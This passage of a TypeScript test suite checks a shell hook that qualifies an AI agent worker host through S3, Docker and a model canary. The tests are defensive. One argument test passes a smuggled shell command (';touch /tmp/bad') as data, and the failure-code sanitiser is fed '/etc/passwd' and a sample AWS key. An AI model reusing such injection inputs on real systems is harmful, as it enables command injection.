    const object = (name: string) => { const path = join(objects, qualificationPrefix, name); return existsSync(path) ? readFileSync(path, "utf8") : undefined; };
    return { result, called, object, evidence };
  }

  it("fetches the challenge, then runs the qualifier on it, then uploads the proposal and a SUCCEEDED status, in that order", () => {
    const { result, called, object } = runHook();
    expect(result.status, result.stderr).toBe(0);
    const step = (call: string) => (call.startsWith("aws s3api get-object") ? "fetch" : call.startsWith("docker exec") ? "exec" : call.startsWith("docker image inspect") ? "inspect" : call.startsWith("aws s3api put-object") ? (call.includes("proposal.json") ? "upload-proposal" : call.includes("ready.json") ? "upload-ready" : "upload-status") : call.split(" ")[0]);
    expect(called.map(step).filter((name) => name !== "chown" && name !== "mv")).toEqual(["inspect", "upload-ready", "fetch", "exec", "upload-proposal", "upload-status", "exec"]);
    // The ready marker comes once the worker answers, before the challenge is looked for, so boot time never eats the challenge's lifetime.
    expect(object("ready.json")).toContain('"state":"READY"');
    // Moves into the uid-1000 evidence directory are of a file onto that exact name, never into a directory of that name.
    expect(called.find((call) => call.startsWith("mv"))).toContain("mv -fT ");
    expect(called.find((call) => call.includes("get-object"))).toContain(`--bucket ${qualification.bucket} --key ${qualificationPrefix}challenge.json`);
    expect(called.find((call) => call.startsWith("chown"))).toContain("1000:1000");
    const exec = called.find((call) => call.startsWith("docker exec")) ?? "";
    expect(exec).toContain("--user node agentx-worker /usr/local/bin/node /opt/agentx/packages/verifier/dist/install-qualification-cli.js");
    expect(exec).toContain("--profile linux-arm64-web-api-v1");
    expect(exec).toContain("--challenge-file /mnt/agentx-runtime/evidence/runtime-install-challenge.json");
    expect(exec).toContain("--evidence-root /mnt/agentx-runtime/evidence");
    expect(exec).toContain("--out /mnt/agentx-runtime/evidence/runtime-install-proposal.json");
    expect(object("proposal.json")).toBe("x".repeat(64));
    const status = JSON.parse(object("status.json") ?? "{}") as { state?: string; reason?: string; finishedAt?: string };
    expect(status).toMatchObject({ state: "SUCCEEDED", reason: "qualified" });
    expect(status.finishedAt).toMatch(/^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/);
    expect(called.join("\n")).not.toMatch(/secret|token/i);
  });

  it("records the executor image and the features /ping reports in ready.json and status.json, for test-deploy --check to read", () => {
    const { result, object } = runHook();
    expect(result.status, result.stderr).toBe(0);
    for (const name of ["ready.json", "status.json"]) {
      expect(JSON.parse(object(name) ?? "{}"), name).toMatchObject({ executorImage, invocationFeatures: ["task.readiness", "task.workflowChecks"] });
    }
    // A failure after the worker answered still says what it was running.
    const failed = runHook({ challenge: "missing" });
    expect(JSON.parse(failed.object("status.json") ?? "{}")).toMatchObject({ state: "FAILED", reason: "challenge-unavailable", executorImage, invocationFeatures: ["task.readiness", "task.workflowChecks"] });
    // A worker that never answered has no features to report, but the image it was given is known.
    const down = runHook({ ping: "down" });
    const downStatus = JSON.parse(down.object("status.json") ?? "{}") as Record<string, unknown>;
    expect(downStatus).toMatchObject({ state: "FAILED", reason: "worker-not-healthy", executorImage });
    expect(downStatus).not.toHaveProperty("invocationFeatures");
  });

  it("keeps status.json well formed, and omits the features, when /ping answers with anything but a plain feature list", () => {
    for (const pingBody of ['{"invocationFeatures":["a\\"b"]}', '{"invocationFeatures":"x"}', '{"invocationFeatures":[1]}', "not json", '{"invocationFeatures":["a\\u0020b"]}']) {
      const { result, object } = runHook({ pingBody });
      expect(result.status, pingBody).toBe(0);
      const status = JSON.parse(object("status.json") ?? "{}") as Record<string, unknown>;
      expect(status, pingBody).toMatchObject({ state: "SUCCEEDED", executorImage });
      expect(status, pingBody).not.toHaveProperty("invocationFeatures");
    }
  });

  it("reads a pretty-printed /ping and records the first features field once", () => {
    const pretty = '{\n  "status": "Healthy",\n  "invocationFeatures": [\n    "task.readiness",\n    "task.workflowChecks"\n  ]\n}';
    const first = runHook({ pingBody: pretty });
    expect(first.result.status, first.result.stderr).toBe(0);
    expect(JSON.parse(first.object("status.json") ?? "{}")).toMatchObject({ state: "SUCCEEDED", invocationFeatures: ["task.readiness", "task.workflowChecks"] });
    const twice = runHook({ pingBody: '{"invocationFeatures":["a.b"],"x":{"invocationFeatures":["c.d"]}}' });
    expect(JSON.parse(twice.object("status.json") ?? "{}")).toMatchObject({ state: "SUCCEEDED", invocationFeatures: ["a.b"] });
  });

  it("is refused, touching nothing, for a malformed role ID, instance ID, profile, bucket, region or executor image", () => {
    const withArg = (index: number, value: string) => hookArgs.map((arg, at) => (at === index ? value : arg));
    for (const args of [
      withArg(2, `e2e-runtime/${runId}/`),
      withArg(2, ""),
      withArg(2, "AIDAEXAMPLEUSERID1234"),
      withArg(2, "AROAshort"),
      withArg(2, `${roleId}/../`),
      withArg(2, `${roleId}:${instanceId}`),
      withArg(2, `${roleId}*`),
      withArg(2, `${roleId.toLowerCase()}`),
      withArg(3, ""),
      withArg(3, "i-xyz"),
      withArg(3, "i-0123456789ABCDEF0"),
      withArg(3, `${instanceId}/../`),
      withArg(3, `${instanceId} x`),
      withArg(3, `${instanceId}*`),
      withArg(4, "linux-arm64-docker-v1"),
      withArg(1, "Bad Bucket"),
      withArg(1, ""),
      withArg(0, "us east"),
      withArg(5, ""),
      withArg(5, "111122223333.dkr.ecr.us-east-1.amazonaws.com/agentx/executor:latest"),
      withArg(5, `docker.io/library/node@sha256:${"c".repeat(64)}`),
      withArg(5, `${executorImage};touch /tmp/bad`),
    ]) {
      const { result, called } = runHook({ args });
      expect(result.status, JSON.stringify(args)).toBe(2);
      expect(called, JSON.stringify(args)).toEqual([]);
    }
  });

  it("reads and writes only under the prefix built from its own role ID and instance ID", () => {
    const { called } = runHook();
    const keys = called.flatMap((call) => [...call.matchAll(/--key (\S+)/g)].map((match) => match[1]));
    expect(keys.length).toBeGreaterThan(0);
    for (const key of keys) expect(key?.startsWith(qualificationPrefix), key).toBe(true);
  });

  describe("the model canary (M1.4 Task 4.9)", () => {
    it("after a qualification that succeeded, hands the worker its own prefix to wait for the operator's canary request, bounded by timeout", () => {
      const { result, called, object } = runHook();
      expect(result.status, result.stderr).toBe(0);
      const execs = called.filter((call) => call.startsWith("docker exec"));
      expect(execs).toHaveLength(2);
      expect(execs[1]).toBe(`docker exec --user node agentx-worker /usr/local/bin/node /opt/agentx/packages/worker/dist/e2e-model-canary-cli.js --bucket ${qualification.bucket} --prefix ${qualificationPrefix}`);
      expect(qualificationScript).toMatch(/timeout [^\n]*e2e-model-canary-cli\.js/);
      // The canary comes after the qualification's own status, which it never changes.
      expect(JSON.parse(object("status.json") ?? "{}")).toMatchObject({ state: "SUCCEEDED", reason: "qualified" });
      expect(called.findIndex((call) => call.includes("status.json"))).toBeLessThan(called.lastIndexOf(execs[1]!));
    });

    // Task 4.10C, test 33 (CANARYLOG): the model check server's output reaches the journal instead of /dev/null.
    it("writes the server's fixed lines to the journal, and its hook has no redirect to /dev/null", () => {
      const { result } = runHook();
      expect(result.status, result.stderr).toBe(0);
      const lines = result.stderr.split("\n").filter((line) => line.includes("model-check:"));
      expect(lines).toEqual(["agentx-e2e-qualification: model-check: request not readable (SlowDown)"]);
      const hook = qualificationScript.split("\n").find((line) => line.includes("e2e-model-canary-cli.js"))!;
      expect(hook).not.toMatch(/\/dev\/null/);
      expect(hook).toMatch(/2>&1 \| while read l; do log "\$l"; done/);
      // It serves for the registration's seven days, with a little margin.
      expect(hook).toMatch(/timeout --foreground --kill-after=10s 7d /);
    });

    it("never runs after a failed qualification", () => {
      const { called } = runHook({ qualifier: 3 });
      expect(called.filter((call) => call.startsWith("docker exec"))).toHaveLength(1);
      expect(called.some((call) => call.includes("e2e-model-canary-cli.js"))).toBe(false);
    });
  });

  describe("the executor image", () => {
    it("is left alone when the host already has it", () => {
      const { result, called } = runHook({ executor: "present" });
      expect(result.status, result.stderr).toBe(0);
      expect(called.filter((call) => call.startsWith("docker image inspect"))).toEqual([`docker image inspect ${executorImage}`]);
      expect(called.some((call) => call.startsWith("docker pull") || call.startsWith("docker login") || call.startsWith("aws ecr"))).toBe(false);
    });

    it("is logged in to its registry and pulled when missing, then checked again, before the host is called ready", () => {
      const { result, called, object } = runHook({ executor: "pullable" });
      expect(result.status, result.stderr).toBe(0);
      const executorCalls = called.filter((call) => /^(docker (image|login|pull)|aws ecr)/.test(call));
      // The password pipe's two ends are started together, so their log lines come in either order.
      expect([executorCalls[0], ...executorCalls.slice(1, 3).sort(), ...executorCalls.slice(3)]).toEqual([
        `docker image inspect ${executorImage}`,
        "aws ecr get-login-password --region us-east-1",
        "docker login --username AWS --password-stdin 111122223333.dkr.ecr.us-east-1.amazonaws.com",
        `docker pull ${executorImage}`,
        `docker image inspect ${executorImage}`,
      ]);
      // The registry password goes through a pipe: it is never an argument of any call.
      expect(called.join("\n")).not.toContain("registry-password");
      expect(called.findIndex((call) => call.startsWith("docker pull"))).toBeLessThan(called.findIndex((call) => call.includes("ready.json")));
      expect(object("ready.json")).toContain('"state":"READY"');
    });

    it("is bounded: the pull and the registry login run under timeout", () => {
      expect(qualificationScript).toMatch(/timeout[^\n]*docker pull/);
      expect(qualificationScript).toMatch(/timeout[^\n]*aws ecr get-login-password/);
      expect(qualificationScript).toMatch(/timeout[^\n]*docker login/);
    });

    it("fails with executor-image-unavailable, before the host is called ready or the challenge is fetched, when it is still missing after the pull", () => {
      const { result, called, object } = runHook({ executor: "missing" });
      expect(result.status).toBe(1);
      const status = JSON.parse(object("status.json") ?? "{}") as { state?: string; reason?: string };
      expect(status).toMatchObject({ state: "FAILED", reason: "executor-image-unavailable" });
      expect(object("ready.json")).toBeUndefined();
      expect(object("proposal.json")).toBeUndefined();
      expect(called.some((call) => call.includes("get-object") || call.startsWith("docker exec"))).toBe(false);
      expect(called.filter((call) => call.startsWith("docker pull"))).toHaveLength(1);
      expect(called.join("\n")).not.toMatch(/docker (stop|rm|kill|restart)|systemctl/);
    });
  });

  it.each([
    ["the worker never becomes healthy", { ping: "down" as const }, "worker-not-healthy", ["aws"]],
    ["the challenge never appears", { challenge: "missing" as const }, "challenge-unavailable", ["aws", "docker"]],
    ["the qualifier fails", { qualifier: 3 }, "qualification-failed-exit-3", ["aws", "docker", "chown", "mv"]],
    ["the proposal is larger than the registrar accepts", { proposalBytes: 5 * 1024 * 1024 + 1 }, "proposal-too-large", ["aws", "docker", "chown", "mv"]],
  ])("uploads a FAILED status with the reason and no proposal when %s", (_name, options, reason, tools) => {
    const { result, called, object } = runHook(options);
    expect(result.status).toBe(1);
    expect(object("proposal.json")).toBeUndefined();
    const status = JSON.parse(object("status.json") ?? "{}") as { state?: string; reason?: string; finishedAt?: string };
    expect(status).toMatchObject({ state: "FAILED", reason });
    expect(typeof status.finishedAt).toBe("string");
    expect(new Set(called.map((call) => call.split(" ")[0]))).toEqual(new Set(tools));
    // Whatever failed, the worker is untouched: the hook never stops, restarts or removes anything.
    expect(called.join("\n")).not.toMatch(/docker (stop|rm|kill|restart)|systemctl/);
  });

  describe("the failure codes in status.json", () => {
    type Failure = { codes: string[] };
    const failureOf = (options: HookOptions) => {
      const { result, called, object } = runHook({ qualifier: 1, ...options });
      expect(result.status).toBe(1);
      const status = JSON.parse(object("status.json") ?? "{}") as { state?: string; reason?: string; failure?: Failure; executorImage?: string };
      expect(status).toMatchObject({ state: "FAILED", reason: "qualification-failed-exit-1", executorImage });
      return { status, called, object, result };
    };
    /** The qualifier's failure file: the stage first, as the qualifier writes it. */
    const file = (value: { stage: string; reasons: unknown; summary: unknown } & Record<string, unknown>) => JSON.stringify({ schemaVersion: "runtime-install-failure/v1", ...value });
    const code = /^[a-z0-9-]+(:[a-z0-9-]+)?$/;

    it("asks the qualifier for a failure file, and shows the stage and the failing probe's codes next to the exit code", () => {
      const { status, called } = failureOf({ failureFile: file({ stage: "qualification-rejected", reasons: ["probe-wrong-cause:api-egress-denial-v1"],
        summary: ["api-egress-denial-v1:collector-failed", "api-egress-denial-v1:sinkhole-0"] }) });
      expect(called.find((call) => call.startsWith("docker exec"))).toContain("--failure-out /mnt/agentx-runtime/evidence/runtime-install-failure.json");
      expect(status.failure).toEqual({ codes: ["qualification-rejected", "probe-wrong-cause:api-egress-denial-v1", "api-egress-denial-v1:collector-failed", "api-egress-denial-v1:sinkhole-0"] });
    });

    it("has no failure object when the qualifier left no failure file, even if an earlier run left one", () => {
      expect(failureOf({}).status).not.toHaveProperty("failure");
      expect(failureOf({ staleFailure: file({ stage: "qualification-rejected", reasons: ["probe-wrong-cause:stale"], summary: [] }) }).status).not.toHaveProperty("failure");
    });

    it("opens the qualifier's files without following a symlink, so a link swapped in after a check cannot make the hook read or upload another file", () => {
      expect(qualificationScript).toContain('dd if="$f" iflag=nofollow bs=16384 count=1');
      expect(qualificationScript).toContain('dd if="$EVIDENCE_HOST/$PROPOSAL_NAME" iflag=nofollow of="$proposal"');
      // A failure file that is a symlink yields no codes, however good its target looks.
      const linked = failureOf({ link: true, failureFile: file({ stage: "qualification-rejected", reasons: ["probe-wrong-cause:from-a-link"], summary: [] }) });
      expect(linked.status.failure).toEqual({ codes: [] });
      // A proposal that is a symlink is not uploaded: the hook reports it missing.
      const proposal = runHook({ link: true });
      expect(proposal.result.status).toBe(1);
      expect(JSON.parse(proposal.object("status.json") ?? "{}")).toMatchObject({ state: "FAILED", reason: "proposal-missing" });
      expect(proposal.object("proposal.json")).toBeUndefined();
    });

    it("never lets free text through: anything that is not a code is dropped, and the qualifier's log is never uploaded", () => {
      const secret = "AKIAIOSFODNN7EXAMPLE";
      const { status, object, called } = failureOf({ failureFile: file({ stage: "qualification-rejected", message: `Error: ${secret} at /home/node/x.js:1`,
        reasons: ["probe-wrong-cause:web-csv-negative-v1", "Error: token leaked", "has space", "UPPER-case", "a:b:c", "/etc/passwd", `${secret}`, "x".repeat(49), "positive-probe-failed:app-host-denial-v1"],
        summary: ["web-csv-negative-v1:collector-pass", "not a code", "ok:fine"] }) });
      expect(status.failure).toEqual({ codes: ["qualification-rejected", "probe-wrong-cause:web-csv-negative-v1", "positive-probe-failed:app-host-denial-v1", "web-csv-negative-v1:collector-pass", "ok:fine"] });
      expect(JSON.stringify(status)).not.toMatch(/AKIA|token|passwd|home\/node|Error/);
      expect(called.filter((call) => call.startsWith("aws s3api put-object")).every((call) => !/qualifier\.log|failure\.json/.test(call))).toBe(true);
      expect(object("qualifier.log")).toBeUndefined();
      expect(object("runtime-install-failure.json")).toBeUndefined();
    });

    it("keeps status.json well formed, with no codes, when the file holds none", () => {
      expect(failureOf({ failureFile: file({ stage: "Free Text: oops", reasons: "Probe Wrong Cause", summary: null }) }).status.failure).toEqual({ codes: [] });
      expect(failureOf({ failureFile: "not json at all \"quoted free text\"" }).status.failure).toEqual({ codes: [] });
    });

    it("keeps at most 16 codes and 2 KB, whatever the file holds, and reads only the head of a large file", () => {
      const reasons = Array.from({ length: 40 }, (_, index) => `probe-wrong-cause:probe-${index}`);
      const { status } = failureOf({ failureFile: file({ stage: "qualification-rejected", reasons, summary: ["x:one"] }) });
      expect(status.failure!.codes).toEqual(["qualification-rejected", ...reasons.slice(0, 15)]);
      // Codes of the longest length the hook accepts (48 characters either side of the colon): 16 of them are still under 2 KB.
      const longest = Array.from({ length: 40 }, (_, index) => `${String(index).padStart(2, "0")}${"a".repeat(46)}:${"b".repeat(48)}`);
      const longStatus = failureOf({ failureFile: file({ stage: "s".repeat(48), reasons: longest, summary: [] }) }).status.failure!;
      expect(longStatus.codes).toEqual(["s".repeat(48), ...longest.slice(0, 15)]);
      expect(Buffer.byteLength(JSON.stringify(longStatus.codes))).toBeLessThanOrEqual(2_048);
      for (const entry of longStatus.codes) expect(entry).toMatch(code);
      // A code with a part longer than 48 characters is not a code the hook keeps.
      expect(failureOf({ failureFile: file({ stage: "qualification-rejected", reasons: [`${"a".repeat(49)}:b`, "ok:fine"], summary: [] }) }).status.failure!.codes).toEqual(["qualification-rejected", "ok:fine"]);
      // Only the first 16 KB of the file is read.
      const huge = failureOf({ padBytes: 200_000, failureFile: `{"pad":"__PAD__","reasons":["probe-wrong-cause:late"],"stage":"qualification-rejected"}` }).status.failure!;
      expect(huge).toEqual({ codes: [] });
    });
  });
});
